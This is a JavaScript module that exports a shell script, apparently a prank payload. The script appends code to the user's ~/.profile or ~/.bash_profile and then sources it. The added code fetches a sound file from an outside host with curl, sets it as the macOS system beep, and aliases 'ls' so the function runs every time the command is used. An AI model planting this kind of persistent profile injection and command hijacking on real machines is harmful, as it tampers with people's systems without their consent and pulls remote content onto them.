module.exports = `
if [ -f ~/.profile ] 
then
  echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.profile
  echo "alias ls='eles && ls'" >> ~/.profile
  source ~/.profile
else 
  echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.bash_profile
  echo "alias ls='eles && ls'" >> ~/.bash_profile
  source ~/.bash_profile
fi
`
